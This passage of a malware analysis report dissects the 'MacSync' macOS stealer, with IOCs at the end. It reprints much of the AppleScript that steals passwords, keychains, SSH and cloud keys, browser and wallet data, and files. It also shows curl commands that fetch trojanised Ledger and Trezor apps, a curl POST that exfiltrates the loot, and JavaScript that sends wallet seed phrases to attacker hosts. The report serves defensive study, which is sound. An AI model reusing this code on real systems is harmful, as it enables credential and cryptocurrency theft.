        do shell script "curl -k --user-agent 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36' -H 'api-key: 5190ef1733183a0dc63fb623357f56d6' -L " & quoted form of LEDGERURL & " -o " & quoted form of LEDGERDMGPATH
        do shell script "unzip -q -o " & quoted form of LEDGERDMGPATH & " -d " & quoted form of LEDGERMOUNT
        set app_exists to false
		try
            do shell script "test -e " & quoted form of LEDGERPATH0
            set app_exists to true
		on error
			set app_exists to false
        end try
		try
            do shell script "test -e " & quoted form of LEDGERPATH1
            set app_exists to true
		on error
			set app_exists to false
        end try
		if app_exists then
			do shell script "cp -rf " & quoted form of LEDGERDEST & " " & quoted form of LEDGERTMPDEST
			do shell script "rm -rf " & quoted form of LEDGERDEST
			do shell script "mv " & quoted form of LEDGERTMPDEST & " " & quoted form of LEDGERDEST
            do shell script "mv " & quoted form of LEDGERPATH0 & " " & quoted form of LEDGERDESTFILE0
            do shell script "mv " & quoted form of LEDGERPATH1 & " " & quoted form of LEDGERDESTFILE1
			do shell script "codesign -f -d -s - " & quoted form of LEDGERDEST
        end if
    end try

end if

set TREZORURL to "hxxps[://]ballfrank[.]today/trezor/270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514"
set TREZORDMGPATH to "/tmp/270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514.zip"
set TREZORMOUNT to "/tmp"
set TREZORNAME to "Trezor Suite.app"
set TREZORPATH to TREZORMOUNT & "/" & TREZORNAME
set TREZORAPPFOLDER to "/Applications"
set TREZORDEST to TREZORAPPFOLDER & "/" & TREZORNAME

try
    do shell script "test -d " & quoted form of TREZORDEST
    set trezor_installed to true
on error
    set trezor_installed to false
end try

if trezor_installed then
    try
        do shell script "curl -k --user-agent 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36' -H 'api-key: 5190ef1733183a0dc63fb623357f56d6' -L " & quoted form of TREZORURL & " -o " & quoted form of TREZORDMGPATH
        do shell script "unzip -q -o " & quoted form of TREZORDMGPATH & " -d " & quoted form of TREZORMOUNT
        set app_exists to false
        try
            do shell script "test -e " & quoted form of TREZORPATH
            set app_exists to true
        end try
        
        if app_exists then
            try
                do shell script "killall -9 'Trezor Suite'"
            end try
            do shell script "rm -rf " & quoted form of TREZORDEST
            do shell script "cp -R " & quoted form of TREZORPATH & " " & quoted form of TREZORAPPFOLDER
        end if
    end try

    try
        do shell script "rm -rf " & quoted form of TREZORDMGPATH
        do shell script "rm -rf " & quoted form of TREZORPATH
    end try
end if
  </code></pre>
</details>

Upon execution, the script prompts the user to enter their password, and will repeatedly ask until the correct password is entered, it will then save the password to disk.

<img width="429" height="186" alt="image" src="https://github.com/user-attachments/assets/50026e35-301f-4b95-b21e-e97e910a78b6" />


```
set password_entered to getpwd(username, writemind, "")
...
writeText(password_entered, writemind & "Password")
```

The malware enumerates Chromium-based browsers and a set of cryptocurrency wallet applications/extensions for exfiltration.
The following extension IDs are checked in relation to MFA / password vaults:
```nosyntax
eiaeiblijfjekdanodkjadfinkhbfgcd - NordPass® Password Manager & Digital Vault
aeblfdkhhhdcdjpifhhbdiojplfjncoa - 1Password – Password Manager
bfogiafebfohielmmehodmfbbebbbpei - Keeper® Password Manager & Digital Vault
nngceckbapebfimnlniiiahkandclblb - Bitwarden Password Manager
fdjamakpfbbddfjaooikfcpapjohcfmg - Dashlane — Password Manager
hdokiejnpimakedhajhdlcegeplioahd - LastPass: Free Password Manager
pnlccmojcmeohlpggmfnbbiapkmbliob - RoboForm Password Manager
ghmbeldphafepmbegfdlkpapadhbakde - Proton Pass: Free Password Manager
kmcfomidfpdkfieipokbalgegidffkal - Enpass Password Manager
bnfdmghkeppfadphbnkjcicejfepnbfe - Sticky Password manager & safe
caljgklbbfbcjjanaijlacgncafpegll - Avira Password Manager
folnjigffmbjmcjgmbbfcpleeddaedal - LogMeOnce
igkpcodhieompeloncfnbekccinhapdb - Zoho Vault - Password Manager
admmjipmmciaobhojoghlmleefbicajg - Norton Password Manager
ehpbfbahieociaeckccnklpdcmfaeegd - RememBear
epanfjkfahimkgomnigadpkobaefekcd - IronVest Extension
didegimhafipceonhjepacocaffmoppf - Passbolt - Open source password manager
oboonakemofpalcgghocfoadofidjkkk - KeePassXC-Browser
jgnfghanfbjmimbdmnjfofnbcgpkbegj - KeePassHelper Password Manager
mmhlniccooihdimnnjhamobppdhaolme - Kee - Password Manager
dbfoemgnkgieejfkaddieamagdfepnff - 2FAS Auth - Two Factor Authentication
bhghoamapcdpbohphigoooaddinpkbai - Authenticator
nngceckbapebfimnlniiiahkandclblb - Bitwarden Password Manager
lojeokmpinkpmpbakfkfpgfhpapbgdnd - Google Verified Access by Duo
ibpjepoimpcdofeoalokgpjafnjonkpc - TOTP Authenticator
gmohoglkppnemohbcgjakmgengkeaphi - 2FA Authenticator
dckgbiealcgdhgjofgcignfngijpbgba - Open Two-Factor Authenticator
gmegpkknicehidppoebnmbhndjigpica - Web2FA - Authenticator
eiokpeobbgpinbmcanngjjbklmhlepan - MFAuth - 2FA Authenticator
odfkmgboddhcgopllebhkbjhokpojigd - Authenticator Extension
ppnbnpeolgkicgegkbkbjmhlideopiji - Microsoft Single Sign On
cejfhijdfemlohmcjknpbeaohedoikpp - Secure TOTP Authenticator - 2FA Code Manager - MFA
nmhjblhloefhbhgbfkdgdpjabaocnhha - mini authenticator
iklgijhacenjgjgdnpnohbafpbmnccek - 2! Authenticator
ppkkcfblhfgmdmefkmkoomenhgecbemi - Authenticator for PC
lgndjfkadlbpaifdpbbobdodbaiaiakb - Authenticator App
bbphmbmmpomfelajledgdkgclfekilei - Authenticator app
bnfooenhhgcnhdkdjelgmmkpaemlnoek - Auto 2FA
```

Additionally, a large number of extensions are checked related to cryptocurrency wallets.

The malware will copy the data from these extensions, including IndexedDB, Local Extension Settings, cookies, and saved passwords.

There is functionality to exfiltrate Telegram data:
```osascript
on Telegram(writemind, library)
    try
        GrabFolder(library & "Telegram Desktop/tdata/", writemind & "Telegram Desktop/")
    end try
end Telegram
```

Keychain, SSH & Cloud keys:
```
on Keychains(writemind)
    try
        do shell script "cp ~/Library/Keychains/*.keychain-db " & quoted form of (POSIX path of writemind)
    end try
end Keychains
...
on CloudKeys(writemind)
    try
        do shell script "cp -r ~/.ssh " & quoted form of (POSIX path of writemind)
        do shell script "cp -r ~/.aws " & quoted form of (POSIX path of writemind)
        do shell script "cp -r ~/.kube " & quoted form of (POSIX path of writemind)
    end try
end CloudKeys
```

File Grabber:
```
on FilegrabberFDA(writemind, profile)
    set destinationFolderPath to POSIX file (writemind & "FileGrabber/")
    mkdir(destinationFolderPath)
    set sourceFolders to {profile & "/Downloads/", profile & "/Documents/", profile & "/Desktop/"}
    set extensionsList to {"pdf", "docx", "wallet", "key", "keys", "db", "txt", "seed", "rtf", "kdbx", "pem", "ovpn"}
    
    repeat with src in sourceFolders
        repeat with ext in extensionsList
            try
                set shellCmd to "find " & quoted form of (POSIX path of src) & " -maxdepth 1 -type f -iname '*." & ext & "' -print0 | xargs -0 -J% cp -vp % " & quoted form of (POSIX path of destinationFolderPath)
                do shell script shellCmd
            end try
        end repeat
    end repeat
end FilegrabberFDA
```

System information is collected including the Users IP which is actually hardcoded in the initial script as it's populated from when the script is Curled.

```
try
	writeText("MacSync Stealer\n\n", writemind & "info")
	writeText("Build Tag: s3\n", writemind & "info")
	writeText("Version: 1.1.2_release (x64_86 & ARM)\n", writemind & "info")
    writeText("IP: [REDACTED_IP]]\n\n", writemind & "info")
	writeText("Username: " & username, writemind & "info")
	writeText("\nPassword: " & password_entered & "\n\n", writemind & "info")
	set result to (do shell script "system_profiler SPSoftwareDataType SPHardwareDataType SPDisplaysDataType")
	writeText(result, writemind & "info")
end try
```

The information is initially collected and stored in the direct /tmp/sync[RANDOM-NUMBER]

```
set randomNumber to do shell script "echo $((RANDOM % 9000000 + 1000000))"
set writemind to "/tmp/sync" & randomNumber & "/"
```

The collected information is then compressed into a zip archive located at '/tmp/osalogging.zip', expanded this looks like:

<img width="783" height="277" alt="image" src="https://github.com/user-attachments/assets/5ca34cc9-b285-4755-bbe1-a0589422cbb7" />

A fake compatibility error prompt is then shown to the victim:

<img width="425" height="158" alt="image" src="https://github.com/user-attachments/assets/d0c4a896-5bac-4d0c-81f0-38f4bafa4b0e" />

The zip archive containing all of the users sensitive information is then exfiltrated via a POST request to 'ballfrank[.]today/gate', as was shown in the previous script:

```bash
curl -k -X POST \
     -H "User-Agent: Mozilla/5.0 ..." \
     -H "api-key: $api_key" \
     -H "cl: 0" \
     --max-time 300 \
     -F "file=@/tmp/osalogging.zip" \
     -F "buildtxd=$token" \
     "http://$domain/gate"
```

The script then has the functionality to check for two installed applications and replace them with backdoored compotents if they exist. Ledger & Trezor. We'll first take a look at Trezor. 

## Trezor Suite Application Replacement

The script checks for the presence of '/Applications/Ledger Wallet.app'

If this application exists on the host, it is replaced with a backdoored version downloaded from the malicious domain:

```
set TREZORURL to "hxxps[://]ballfrank[.]today/trezor/270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514"
set TREZORDMGPATH to "/tmp/270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514.zip"
set TREZORMOUNT to "/tmp"
set TREZORNAME to "Trezor Suite.app"
set TREZORPATH to TREZORMOUNT & "/" & TREZORNAME
set TREZORAPPFOLDER to "/Applications"
set TREZORDEST to TREZORAPPFOLDER & "/" & TREZORNAME
```

The most interesting element of the replaced Info.plist file are that the malicious domain is explicitly allowed under an ATS exception:

```
<key>NSAppTransportSecurity</key>
<dict>
  <key>NSExceptionDomains</key>
  <dict>
    <key>ballfrank[.]today</key>
```

The Trezor Suite application is then replaced with a binary which seemingly has no wallet functionality, but instead a WebView loader pointing at attacker infrastructure, fingerprinted by the 'API Key'.

```C
100000b7c        _objc_storeStrong(location: &location_11, obj: applicationDidFinishLaunching)
100000b8f        id (* const var_228)(id obj) = _objc_retain
100000ba2        // hxxps[://]ballfrank[.]today/trezor/start/270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514
100000ba2        id location_10 = _objc_retain(obj: &ballfrank.today/trezor URL)
100000bb2        // 5190ef1733183a0dc63fb623357f56d6
100000bb2        id location_9 = _objc_retain(obj: &API_Key_str)
100000bd6        void (* const var_1a8)(void* self, char* cmd) = _objc_msgSend
100000bdf        id location_8 = _objc_msgSend(
100000bdf            self: _objc_alloc(cls: clsRef_WKWebViewConfiguration), cmd: "init")
```

This is what the loader page looks like after executing the trojanised Trezor Suite Application:

<img width="1250" height="810" alt="image" src="https://github.com/user-attachments/assets/b5b07d8a-d5b3-46e2-8bbc-57f23f4353ba" />

Upon entering recovery details, they are sent via a POST request to the '/modules/wallets' endpoint.

```
POST /modules/wallets HTTP/1.1
Host: ballfrank[.]today
Accept: */*
Sec-Fetch-Site: same-origin
Accept-Language: en-GB,en;q=0.9
Accept-Encoding: gzip, deflate, br
Sec-Fetch-Mode: cors
Content-Type: application/json
Origin: https://ballfrank.today
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)
Referer: hxxps[://]ballfrank[.]today/trezor/12/270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514
Content-Length: 177
Connection: keep-alive
Sec-Fetch-Dest: empty
Cookie: PHPSESSID=9vh6eufvm1g1e4ogo8bproigjh

{"seedwords":["123","123","123","123","123","123","123","123","123","123","123","123"],"token":"270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514","app":"trezor"}
```

Server returns:
```
{"status":"success","message":"Success"}
```

A likely fake error message is then returned, despite the recovery seeds being successfully exfiltrated.

<img width="1257" height="803" alt="image" src="https://github.com/user-attachments/assets/9bd5f957-0816-4ed3-a813-20d4f4517983" />

## Ledger Backdoor

MacSync malware can target the victim’s Ledger application, if installed, by extracting a malicious App.asar and Info.plist from a ZIP archive and replacing the legitimate files.

```
set LEDGERURL to "hxxps[://]ballfrank[.]today/ledger/270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514"
set LEDGERMOUNT to "/tmp"
set LEDGERPATH0 to LEDGERMOUNT & "/app.asar"
set LEDGERPATH1 to LEDGERMOUNT & "/Info.plist"
set LEDGERDMGPATH to LEDGERMOUNT & "/270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514.zip"
set LEDGERNAME to "Ledger Wallet.app"
set LEDGERAPPFOLDER to "/Applications"
set LEDGERDEST to LEDGERAPPFOLDER & "/" & LEDGERNAME
set LEDGERTMPDEST to "/tmp/Ledger Wallet.app"
set LEDGERDESTFILE0 to LEDGERDEST & "/Contents/Resources/app.asar"
set LEDGERDESTFILE1 to LEDGERDEST & "/Contents/Info.plist"

try
    do shell script "test -d " & quoted form of LEDGERDEST
    set ledger_installed to true
on error
    set ledger_installed to false
end try

if ledger_installed then
    try
        do shell script "curl -k --user-agent 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36' -H 'api-key: 5190ef1733183a0dc63fb623357f56d6' -L " & quoted form of LEDGERURL & " -o " & quoted form of LEDGERDMGPATH
        do shell script "unzip -q -o " & quoted form of LEDGERDMGPATH & " -d " & quoted form of LEDGERMOUNT
        set app_exists to false
		try
            do shell script "test -e " & quoted form of LEDGERPATH0
            set app_exists to true
		on error
			set app_exists to false
        end try
		try
            do shell script "test -e " & quoted form of LEDGERPATH1
            set app_exists to true
		on error
			set app_exists to false
        end try
		if app_exists then
			do shell script "cp -rf " & quoted form of LEDGERDEST & " " & quoted form of LEDGERTMPDEST
			do shell script "rm -rf " & quoted form of LEDGERDEST
			do shell script "mv " & quoted form of LEDGERTMPDEST & " " & quoted form of LEDGERDEST
            do shell script "mv " & quoted form of LEDGERPATH0 & " " & quoted form of LEDGERDESTFILE0
            do shell script "mv " & quoted form of LEDGERPATH1 & " " & quoted form of LEDGERDESTFILE1
			do shell script "codesign -f -d -s - " & quoted form of LEDGERDEST
        end if
    end try

end if
```

Upon execution of the backdoored Ledger application, it tells you there was a problem and you need to enter your recovery seed from the hardware wallet.

<img width="1026" height="775" alt="image" src="https://github.com/user-attachments/assets/683114d9-f2b3-4faf-8699-f6f84af5952f" />

<img width="1029" height="768" alt="image" src="https://github.com/user-attachments/assets/28efc376-203e-444e-bfdf-c103eeef9121" />

Unsurprisingly, the seed is then exfiltrated to an attacker controlled domain, this time, it's: 'main[.]ledger-gate[.]coupons'

```
POST /modules/wallets HTTP/1.1
Host: main.ledger-gate.coupons
Connection: keep-alive
Content-Length: 356
Cache-Control: max-age=0
sec-ch-ua-platform: "macOS"
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) LedgerWallet/2.133.0 Chrome/140.0.7339.133 Electron/38.2.0 Safari/537.36
sec-ch-ua: "Not=A?Brand";v="24", "Chromium";v="140"
Content-Type: application/json
sec-ch-ua-mobile: ?0
Accept: */*
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-GB

{"seedwords":["123","123","123","123","123","123","123","123","123","123","123","123","123","123","123","123","123","123","123","123","123","123","123","123"],"token":"270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514","app":"ledger","url":"file:///Applications/Ledger%20Wallet.app/Contents/Resources/app.asar/.webpack/recovery-step-3.html"}
```

The decompiled Electron App has the main exfiltration logic under: '[UNPACKED_APP.ASAR]/.webpack/recovery-step-3.html'

```
continueBtn.addEventListener('click', function () {
  if (!this.classList.contains('active')) return;

  const words = Array.from(inputs).map(i => i.value.trim());
  const token = '270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514';
  const targetUrl = 'hxxps[://]main[.]ledger-gate[.]coupons/modules/wallets';

  fetch(targetUrl, {
    method: 'POST',
    cache: 'no-cache',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      seedwords: words,
      token: token,
      app: 'ledger',
      url: location.href
    })
  })
.then(response => {
  location.href = 'index.html';
})
.catch(err => {
  location.href = 'index.html';
});
```

## IOCs
- ballfrank.today

- macfilearchive.com

- ledger-gate.coupons
